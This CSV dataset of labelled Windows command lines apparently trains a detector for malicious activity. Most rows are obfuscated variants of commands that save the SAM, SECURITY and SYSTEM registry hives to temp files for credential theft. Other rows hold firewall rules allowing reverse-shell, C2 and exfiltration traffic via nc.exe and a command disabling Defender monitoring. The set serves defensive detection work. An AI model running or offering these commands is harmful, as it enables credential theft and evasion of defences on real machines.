text,label
"powershell -nop -c ""reg export hklm\security c:\temp\fznio402.dat""",1
"cmd.exe /c ""ping 8.8.8.8""",0
"powershell -nop -c ""reg save hklm\sam c:\temp\spc8v3ba.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\6smtmud3.dat""",1
reg save hklm\security c:\windows\temp\ej1dvra0.save,1
reg export hklm\system c:\windows\temp\dtb7mzw6.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\zvy8nr5l.dat""",1
reg export hklm\system c:\windows\temp\rlvzl3up.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\ypz3sxld.dat""",1
reg export hklm\sam c:\windows\temp\zndc5z0e.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\mq51c5qp.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\kwokr98d.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\r1zlgpt6.dat""",1
reg export hklm\system c:\windows\temp\su2kftow.save,1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\ok1s7b7y.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\gm8rcqgq.dat""",1
reg export hklm\security c:\windows\temp\zmwcs7pn.save,1
reg save hklm\sam c:\windows\temp\l1pbyfi4.save,1
reg export hklm\system c:\windows\temp\7nicnxvg.save,1
reg export hklm\security c:\windows\temp\qsicabfc.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\l5yhvpsw.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\72f50ua2.dat""",1
sc   query   windefend,0
reg export hklm\system c:\windows\temp\t0jjqets.save,1
reg export hklm\sam c:\windows\temp\4a9wepkd.save,1
reg  save  hklm\system  c:\windows\temp\x1bbci7w.save,1
"powershell -nop -c ""reg  export  hklm\sam  c:\windows\temp\5elsu0wl.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\35rbclfk.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\sk9657xa.dat""",1
reg save hklm\security c:\windows\temp\86b4urjr.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\a9s4sptc.dat""",1
reg save hklm\security c:\windows\temp\8y5ovoom.save,1
rule:  c2  beacon  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888,2
"powershell -nop -c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\id4kwexb.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\hartwuhf.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\0toviw01.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\hz5f92er.dat""",1
reg export hklm\system c:\windows\temp\iuvz7qgu.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\28zp6sw7.dat""",1
reg export hklm\system c:\windows\temp\wl907yai.save,1
reg export hklm\security c:\windows\temp\7rijoqau.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\n3e5tdnd.dat""",1
reg save hklm\security c:\windows\temp\93i42gpb.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\8s0ik3bg.dat""",1
reg export hklm\security c:\windows\temp\8lxhmdq7.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\7lmf5ws2.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\whqgdyqw.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\ctotzh9w.dat""",1
reg save hklm\system c:\windows\temp\u7t6q69j.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\vl7rbjkn.dat""",1
"powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\u46583o5.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\znp8cyrh.dat""",1
reg export hklm\security c:\windows\temp\ht2vdvtk.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\88w56dyy.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\fltfkujp.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\07u225b2.dat""",1
reg save hklm\security c:\windows\temp\oefy76cs.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\ic6wcrwp.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\tobwqeo0.save""",1
reg save hklm\system c:\windows\temp\xv6olezq.save,1
reg save hklm\system c:\windows\temp\x0ukdmul.save,1
reg save hklm\system c:\windows\temp\h2kwx787.save,1
reg save hklm\security c:\windows\temp\13ee3ipv.save,1
reg export hklm\sam c:\windows\temp\tzpywmjx.save,1
"powershell -nop -c ""klist purge""",3
reg export hklm\system c:\windows\temp\g69yyg9y.save,1
"powershell -nop -c ""powershell -nop -c ""reg save hklm\security c:\temp\boq6uvva.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\jy2ii6z1.dat""",1
reg export hklm\sam c:\windows\temp\fy4pfk2i.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\ql1aw5yb.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\aluvc9h0.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\isq2rfkj.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\0f9j06qq.dat""",1
"cmd.exe /c ""cmd.exe   /c   ""reg   export   hklm\security   c:\temp\n3apglpd.dat""""",1
"cmd.exe /c ""reg   export   hklm\system   c:\windows\temp\anlwkn4q.save""",1
reg save hklm\security c:\windows\temp\r6bmjqcu.save,1
reg export hklm\system c:\windows\temp\9f6wuugb.save,1
reg export hklm\sam c:\windows\temp\k9qr7wmf.save,1
"cmd.exe /c ""rule:   c2   beacon   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
"powershell -nop -c ""reg save hklm\security c:\temp\xvif86kq.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\6d5675t5.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\bxct3nw5.dat""",1
reg save hklm\system c:\windows\temp\g5agodam.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\qg5hspsz.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\hoekewua.dat""",1
reg save hklm\sam c:\windows\temp\7144t03c.save,1
reg export hklm\sam c:\windows\temp\ssxo4zyj.save,1
reg save hklm\system c:\windows\temp\o5bx34k6.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\erchvfan.dat""",1
"powershell -nop -c ""python -m http.server 8080""",0
reg save hklm\security c:\windows\temp\jfz4ynvz.save,1
"powershell -nop -c ""[dllimport(""advapi32.dll"")]  extern  bool  openprocesstoken(...)""",3
reg  export  hklm\system  c:\windows\temp\lu4v7qvy.save,1
reg save hklm\system c:\windows\temp\2i8h1y5c.save,1
rule:  c2  beacon  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444,2
reg save hklm\sam c:\windows\temp\fotpc7ch.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\dnd3qtle.dat""",1
reg  save  hklm\sam  c:\windows\temp\e7cfob49.save,1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\security c:\temp\0e1so9p1.dat""""",1
"cmd.exe /c ""rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444""",2
"cmd.exe /c ""reg export hklm\sam c:\temp\7pqyqyt6.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\lqs6oufq.dat""",1
reg save hklm\security c:\windows\temp\vshrmux4.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\hhka49ua.dat""",1
reg export hklm\sam c:\windows\temp\wimo908h.save,1
reg save hklm\sam c:\windows\temp\1cpb9aqf.save,1
reg save hklm\security c:\windows\temp\dtiqd1fl.save,1
"powershell -nop -c ""set-mppreference   -disablerealtimemonitoring   $true""",2
"cmd.exe /c ""reg export hklm\sam c:\temp\k7ajm1gt.dat""",1
reg export hklm\system c:\windows\temp\i654awu5.save,1
reg export hklm\system c:\windows\temp\4h1ylphw.save,1
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\olqxo342.dat""",1
reg export hklm\security c:\windows\temp\vsr1kf5e.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\2uda43lx.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\t8zkadve.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\oufpqt9w.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\ax204vg2.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\paemodk9.dat""",1
reg export hklm\system c:\windows\temp\k1uq7hf4.save,1
reg save hklm\sam c:\windows\temp\fyqmeh85.save,1
reg save hklm\system c:\windows\temp\gbwxg3zu.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\x1b0nt2c.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\dxzpm9ht.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\cz7zxqyz.dat""",1
"powershell -nop -c ""rule:   c2   beacon   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
reg save hklm\system c:\windows\temp\wygbphk2.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\wlavyevf.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\7h1wrenw.dat""",1
reg save hklm\security c:\windows\temp\vpnmazsg.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\7essv2tx.dat""",1
reg save hklm\security c:\windows\temp\yqiv1d4h.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\286v9slp.dat""",1
"cmd.exe /c ""reg   export   hklm\sam   c:\windows\temp\q3lnswiw.save""",1
reg save hklm\security c:\windows\temp\214xv59o.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\414an8qh.dat""",1
reg save hklm\security c:\windows\temp\bu7w59yt.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\ao1chdip.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\z3r0713i.dat""",1
"cmd.exe /c ""powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\yaqw6nqq.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\28pw6erk.dat""",1
reg export hklm\system c:\windows\temp\vqiesg8c.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\x4me1ire.dat""",1
reg save hklm\sam c:\windows\temp\jk3z38wu.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\ui17q17i.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\zks1lwbg.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\26aeds4e.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\7fjx0v3e.dat""",1
reg export hklm\security c:\windows\temp\6wg60ne7.save,1
"cmd.exe /c ""cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\b5c7255g.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\wg5wvmip.dat""",1
reg  save  hklm\sam  c:\windows\temp\by4ofq3g.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\7yjg2c7n.dat""",1
"cmd.exe /c ""reg   export   hklm\security   c:\windows\temp\zwg22kxw.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\22uj0vn2.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\0zf21e6e.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\12a45ncr.dat""",1
reg save hklm\security c:\windows\temp\cyzpnv1v.save,1
reg save hklm\security c:\windows\temp\2ung43v6.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\x1spl2pe.dat""",1
"cmd.exe /c ""select-string  -path  c:\logs\app.log  -pattern  'failed  logon'""",0
reg export hklm\system c:\windows\temp\khg032g6.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\warycyi1.dat""",1
reg save hklm\system c:\windows\temp\jwo7pkn9.save,1
reg save hklm\sam c:\windows\temp\2o1rstsn.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\5467qp32.dat""",1
"powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\393fbhox.dat""",1
reg export hklm\sam c:\windows\temp\81m0ea3k.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\w5bghr3q.dat""",1
"cmd.exe /c ""rule:  c2  beacon  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
reg save hklm\sam c:\windows\temp\vm4ore1i.save,1
reg  export  hklm\security  c:\windows\temp\m9er57rp.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\yqtd5jis.dat""",1
reg save hklm\security c:\windows\temp\7devod3l.save,1
reg export hklm\sam c:\windows\temp\y9pqdar8.save,1
"powershell -nop -c ""powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\tjctsd74.dat""""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\a3s21b54.dat""",1
rule: c2 beacon | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 4444,2
reg save hklm\system c:\windows\temp\dbob754d.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\7asy8305.dat""",1
"powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\ngivibfq.dat""",1
reg export hklm\sam c:\windows\temp\sh6oh0b8.save,1
reg export hklm\security c:\windows\temp\c179cspx.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\3sph5rwj.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\mb8xp6pr.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\wrz98ux2.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\n953qv6l.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\n4mugx13.dat""",1
reg save hklm\security c:\windows\temp\otv5gagc.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\rey8b4c1.dat""",1
reg save hklm\system c:\windows\temp\j98vw308.save,1
reg save hklm\security c:\windows\temp\337yly51.save,1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\sam c:\temp\p7e5kup0.dat""""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\zq81ahvy.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\fevtiah1.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\7ciwfnos.dat""",1
reg export hklm\sam c:\windows\temp\xz4fdtpd.save,1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\szgbjytk.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\m67su2kl.dat""",1
"cmd.exe /c ""rule:  exfil  data  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
"powershell -nop -c ""reg save hklm\sam c:\temp\2uiq0tdf.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\8rnc2yv5.dat""",1
"cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\kdpvyv5b.dat""",1
reg save hklm\system c:\windows\temp\hdmn2o7d.save,1
reg export hklm\system c:\windows\temp\b4ul6yg6.save,1
reg save hklm\system c:\windows\temp\g1p2kc6z.save,1
"cmd.exe /c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\7rw5vjya.dat""""",1
reg export hklm\security c:\windows\temp\lxp9vcu5.save,1
"powershell -nop -c ""cmd.exe  /c  ""reg  save  hklm\security  c:\temp\c2dxh4vr.dat""""",1
reg export hklm\security c:\windows\temp\3jpxhh62.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\te5dfbtz.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\5547w06f.dat""",1
"powershell -nop -c ""reg  export  hklm\sam  c:\windows\temp\u7oi2q03.save""",1
reg export hklm\security c:\windows\temp\6iobwu60.save,1
"cmd.exe /c ""rule:   reverse   shell   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
"powershell -nop -c ""reg export hklm\sam c:\windows\temp\42lodpuf.save""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\y2yy3q8j.dat""",1
reg save hklm\security c:\windows\temp\83flxver.save,1
"powershell -nop -c ""rule:  c2  beacon  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
"powershell -nop -c ""reg export hklm\sam c:\temp\975jzptp.dat""",1
"powershell -nop -c ""powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\atxe4arg.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\hsv02wrd.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\26k56qoy.dat""",1
reg export hklm\security c:\windows\temp\siiblprl.save,1
reg export hklm\sam c:\windows\temp\f6y60nf9.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\7ipdgi3m.dat""",1
reg export hklm\system c:\windows\temp\yvle41i5.save,1
"cmd.exe /c ""cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\l8cnietb.dat""""",1
"powershell -nop -c ""cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\1qtqxkii.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\q3dipihv.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\3374rx9p.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\rrvv8i3t.dat""",1
"powershell -nop -c ""rule: exfil data | app: any | dir: outbound | act: allow | port: 1337""",2
"powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\2s89ml29.dat""",1
reg export hklm\security c:\windows\temp\47fh660g.save,1
"powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\ros5gj6y.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\qedbbakz.dat""",1
"[dllimport(""advapi32.dll"")] extern bool duplicatetokenex(...)",3
reg export hklm\sam c:\windows\temp\b5gc95ka.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\ofqywrdu.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\fsf9lmqh.dat""",1
"powershell -nop -c ""rule: reverse shell | app: any | dir: outbound | act: allow | port: tcp 8888""",2
reg save hklm\sam c:\windows\temp\azms3wfn.save,1
"cmd.exe /c ""reg export hklm\security c:\windows\temp\uh580ccm.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\emwooifw.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\gugcbnva.dat""",1
"powershell -nop -c ""cmd.exe /c ""reg save hklm\sam c:\temp\4tqori86.dat""""",1
netsh  dump  >  netconfig.txt,0
"powershell -nop -c ""reg   save   hklm\sam   c:\windows\temp\rxm66ts4.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\49si16xe.dat""",1
rule:   c2   beacon   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888,2
reg export hklm\system c:\windows\temp\uc6d4mgs.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\gczwhecv.dat""",1
"powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\rti31gbf.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\dg253vt6.dat""",1
reg export hklm\system c:\windows\temp\ksygh1tk.save,1
"cmd.exe /c ""backup-utility   save   registry   config""",0
"powershell -nop -c ""reg export hklm\security c:\temp\87n52t69.dat""",1
"powershell -nop -c ""ping   8.8.8.8""",0
reg export hklm\sam c:\windows\temp\m3cbfc1g.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\olikwtt6.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\uabgfjrr.dat""",1
"powershell -nop -c ""cmd.exe /c ""reg export hklm\security c:\temp\mbso6age.dat""""",1
reg export hklm\system c:\windows\temp\u6xlek2h.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\baqedimp.dat""",1
reg export hklm\security c:\windows\temp\onhmcny6.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\1z6p72qz.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\7kpnlod3.dat""",1
"powershell -nop -c ""rule:  c2  beacon  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
reg export hklm\sam c:\windows\temp\baagz2fa.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\bmfdjahv.dat""",1
"powershell -nop -c ""rule:  exfil  data  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
"powershell -nop -c ""reg save hklm\sam c:\temp\xciv3fkl.dat""",1
reg export hklm\system c:\windows\temp\u1zy6x9q.save,1
rule: c2 beacon | app: any | dir: outbound | act: allow | port: tcp 8888,2
reg export hklm\security c:\windows\temp\0pue2uqh.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\cspdlo9n.dat""",1
reg export hklm\system c:\windows\temp\t7t7jwzt.save,1
reg save hklm\security c:\windows\temp\8ywgiffe.save,1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\xlanqlt4.dat""",1
reg export hklm\system c:\windows\temp\yve17n5m.save,1
reg save hklm\sam c:\windows\temp\sfqhpgqw.save,1
reg save hklm\sam c:\windows\temp\nedmocag.save,1
reg save hklm\security c:\windows\temp\vp3ttgbi.save,1
reg save hklm\sam c:\windows\temp\ipy4nxto.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\6tn0wcsu.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\s5visvch.dat""",1
"cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\bi7pmvih.dat""",1
reg export hklm\sam c:\windows\temp\lnjark1l.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\tl3z13bn.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\sdjq2k74.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\bcaihayw.dat""",1
ping 8.8.8.8,0
reg export hklm\sam c:\windows\temp\8mo7ri4d.save,1
reg export hklm\security c:\windows\temp\8p98v026.save,1
reg save hklm\system c:\windows\temp\j5ojf0of.save,1
reg save hklm\sam c:\windows\temp\dk2q6g1l.save,1
reg save hklm\security c:\windows\temp\3nlczzzo.save,1
reg   save   hklm\security   c:\windows\temp\f9rp6sa6.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\npou5ibr.dat""",1
